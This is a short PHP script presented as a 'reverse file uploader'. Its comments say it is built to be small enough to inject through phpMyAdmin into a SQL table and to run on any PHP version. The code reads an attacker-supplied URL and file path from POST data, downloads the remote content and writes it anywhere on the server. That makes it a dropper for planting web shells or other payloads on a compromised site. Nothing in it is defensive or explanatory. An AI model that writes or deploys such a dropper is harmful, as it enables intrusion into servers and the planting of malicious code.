// reverse file uploader in PHP
// this code is specially crafted to work in any OS, with any PHP version (even the oldest) 
// without relying on any external or recent libraries neither any particular PHP settings
// it is also created small enough to fit in a SQL table so it can easily be injected through phpmyadmin
// supports binary format, just set a source web server and target_file_path, target_url POST variables

<?php
@ini_set('magic_quotes_runtime', 0);
@ini_set('max_execution_time', '5000');
@ini_set('max_post_size', '999999999');

function file_get_contents2($filename)
{
	$handle = fopen($filename, "rb");
	$contents = '';
	while (!feof($handle)) {
  		$contents .= fread($handle, 8192);
	}

	fclose($handle);
	return $contents;
}

function file_put_contents2($filename, $data) {
      $fp = fopen($filename, "wb+");
        if(!$fp) {
          trigger_error('file_put_contents cannot write in file.', E_USER_ERROR);
          return;
        }
      fputs($fp, $data);
      fclose($fp);
    }

if(isset($_POST['target_file_path']) && isset($_POST['target_url'])){
	print_r($_POST);
	file_put_contents2($_POST['target_file_path'], file_get_contents2($_POST['target_url'])); 
}
else{
	echo("workin..");
}
?>
